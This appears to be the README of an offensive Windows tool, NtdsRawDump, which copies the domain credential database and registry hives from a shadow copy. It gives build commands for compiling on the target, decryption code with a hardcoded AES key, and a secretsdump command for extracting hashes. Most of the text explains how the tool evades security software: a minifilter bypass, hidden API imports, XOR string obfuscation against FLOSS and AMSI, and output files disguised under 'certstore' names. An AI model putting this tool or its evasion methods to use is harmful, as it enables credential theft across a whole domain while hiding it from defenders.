# NtdsRawDump

Reads `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` from a VSS shadow via raw NTFS cluster reads, AES-256-CBC encrypts each file in-memory, and packages them into a single encrypted archive `certstore.tmp`. No intermediate plaintext or zip file ever touches disk.

## Build

**From VS Developer Command Prompt:**

```
csc /optimize+ /debug- /out:NtdsRawDump.exe NtdsRawDump.cs ^
    /r:System.Management.dll ^
    /r:System.IO.Compression.dll
```

**On target (framework `csc.exe`, .NET 4.5+ required):**

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
  /optimize+ /debug- ^
  /out:NtdsRawDump.exe NtdsRawDump.cs ^
  /r:System.Management.dll ^
  /r:System.IO.Compression.dll
```

> Windows Server 2022 ships with .NET 4.8 — `System.IO.Compression.dll` is present in the GAC and resolvable without an explicit path.

## Usage

```
NtdsRawDump.exe [output_directory]
```

Default `output_directory`: `C:\ProgramData\CertStore`

Output:
- `C:\ProgramData\certstore.tmp` — AES-256-CBC encrypted ZIP archive
- `<output_directory>\ntds.tmp`, `system.tmp`, `sam.tmp`, `security.tmp` — encrypted credential files (also inside the ZIP)

## Decrypt and extract

Requires `pycryptodome`: `pip install pycryptodome`

AES key: `e4e5dd75c6b3d216f0917a6629f33df2104d280381f857d9ed1f3296a77a9478`

```python
from Crypto.Cipher import AES
import os, zipfile

KEY = bytes.fromhex('e4e5dd75c6b3d216f0917a6629f33df2104d280381f857d9ed1f3296a77a9478')

def aes_decrypt(path):
    data = open(path, 'rb').read()
    iv, ct = data[:16], data[16:]
    pt = AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct)
    return pt[:-pt[-1]]  # PKCS7 unpad

# Step 1 — decrypt and extract archive
zip_data = aes_decrypt('certstore.tmp')
open('certstore.zip', 'wb').write(zip_data)
with zipfile.ZipFile('certstore.zip') as z:
    z.extractall('certstore/')
os.remove('certstore.zip')

# Step 2 — decrypt individual credential files
for s, d in [('ntds.tmp','ntds.dit'),('system.tmp','SYSTEM.hiv'),
             ('sam.tmp','SAM.hiv'),('security.tmp','SECURITY.hiv')]:
    p = 'certstore/' + s
    if os.path.exists(p):
        open('certstore/' + d, 'wb').write(aes_decrypt(p))
        print('[+]', s, '->', d)
```

Offline credential extraction:

```bash
impacket-secretsdump -ntds certstore/ntds.dit -system certstore/SYSTEM.hiv -sam certstore/SAM.hiv LOCAL
```

## Evasion techniques

### Raw volume read (file-system minifilter bypass)

Security products that attach as file-system minifilters (e.g. `WdFilter.sys`) intercept `IRP_MJ_READ` callbacks on paths matching `*\ntds.dit` and registry hive paths. `NtdsRawDump` avoids triggering these callbacks by:

1. Opening each target file via the VSS shadow path **only to call `FSCTL_GET_RETRIEVAL_POINTERS`** — retrieves the file's NTFS cluster map without reading file data.
2. Closing the file handle immediately after obtaining the cluster map.
3. Opening the **shadow volume device** (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN`) as a raw block device — reads bypass the file-system minifilter layer entirely and go directly to the storage driver stack.
4. Reading file clusters by raw byte offset (`LCN × BytesPerCluster`) via `ReadFile` on the volume device handle.

### In-memory encryption before any disk write

AES-256-CBC encryption (via `AesCryptoServiceProvider`, delegated to Windows CNG `bcrypt.dll`) is applied to each credential buffer before writing to disk. Output `.tmp` files contain no NTDS or hive magic bytes. A random IV is generated per call and prepended to the ciphertext. No XOR opcode loop appears in IL — removes a common AMSI/MSIL pattern-match signal.

The in-memory ZIP (`ZipArchive` over `MemoryStream`) is AES-encrypted before being flushed as `certstore.tmp`. No intermediate zip file ever lands on disk.

### Dynamic API resolution (IAT reduction)

`CreateFile`, `DeviceIoControl`, `ReadFile`, `SetFilePointerEx`, `GetFileSizeEx`, and `CloseHandle` are **not present in the PE IAT**. The binary imports only `GetModuleHandleW` and `GetProcAddress`; all operational APIs are resolved at runtime via `GetProcAddress` using decoded name strings.

### String obfuscation

All IOC strings (`Win32_ShadowCopy`, `\\.\root\cimv2`, NTDS/hive paths, output filenames, `kernel32.dll` export names) are stored as XOR-encoded byte arrays and decoded in-memory at runtime. None appear as UTF-16 literals in the compiled PE.

Encoding formula: `plaintext[i] = encoded[i] ^ ((0xA3 + i * 0x5B) & 0xFF)`

The position-dependent key means no single extractable constant exists — FLOSS single-byte brute-force yields nothing useful.

## Encoded string reference

| Variable | Plaintext |
| - | - |
| `_wmi_ns` | `\\.\root\cimv2` |
| `_wmi_class` | `Win32_ShadowCopy` |
| `_meth_create` | `Create` |
| `_param_vol` | `Volume` |
| `_vol_path` | `C:\` |
| `_param_ctx` | `Context` |
| `_ctx_val` | `ClientAccessible` |
| `_ret_val` | `ReturnValue` |
| `_shadow_id` | `ShadowID` |
| `_dev_obj` | `DeviceObject` |
| `_wmi_where` | `SELECT * FROM Win32_ShadowCopy WHERE ID=` |
| `_path_ntds` | `\Windows\NTDS\ntds.dit` |
| `_path_sys` | `\Windows\System32\config\SYSTEM` |
| `_path_sam` | `\Windows\System32\config\SAM` |
| `_path_sec` | `\Windows\System32\config\SECURITY` |
| `_out_ntds` | `ntds.tmp` |
| `_out_sys` | `system.tmp` |
| `_out_sam` | `sam.tmp` |
| `_out_sec` | `security.tmp` |
| `_default_out` | `C:\ProgramData\CertStore` |
| `_tmp_name` | `certstore.tmp` |
| `_k32` | `kernel32.dll` |
| `_k32_cf` | `CreateFileW` |
| `_k32_dic` | `DeviceIoControl` |
| `_k32_gfse` | `GetFileSizeEx` |
| `_k32_rf` | `ReadFile` |
| `_k32_sfpe` | `SetFilePointerEx` |
| `_k32_ch` | `CloseHandle` |
| `_aes_key` | `e4e5dd75c6b3d216f0917a6629f33df2104d280381f857d9ed1f3296a77a9478` (AES-256-CBC key) |
